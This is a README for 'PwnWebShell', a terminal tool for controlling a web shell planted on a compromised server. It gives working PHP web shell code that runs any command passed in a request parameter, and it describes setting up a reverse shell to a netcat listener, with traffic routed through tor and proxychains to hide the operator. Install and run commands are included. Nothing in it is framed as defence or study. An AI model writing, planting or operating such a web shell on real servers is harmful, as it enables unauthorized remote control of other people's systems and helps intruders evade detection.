# PwnWebShell
Tool to facilitate the management of our webshell from a terminal.

All we need, is to upload to the committed server a PHP structure like the following to execute commands:

```
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

After that specify the url where the .php file is located in the script variable called url_webshell, example url_webshell="https://example.com/shell.php"

![demo](https://raw.githubusercontent.com/DarkTrojanDev/PwnWebShell/main/img/url_example.png)

You can configure the reverse shell, specify your IP address and the port on netcat listening.

![demo](https://raw.githubusercontent.com/DarkTrojanDev/PwnWebShell/main/img/reverse.png)

**Requirements - curl tor proxychains rlwrap**

`sudo apt install curl tor proxychains-ng rlwrap -y`

**Installation**

  
1. `git clone https://github.com/DarkTrojanDev/PwnWebShell.git`


2. `chmod +x pwnwebshell.sh`


**Execution**
	
1. `sudo rlwrap ./pwnwebshell.sh`

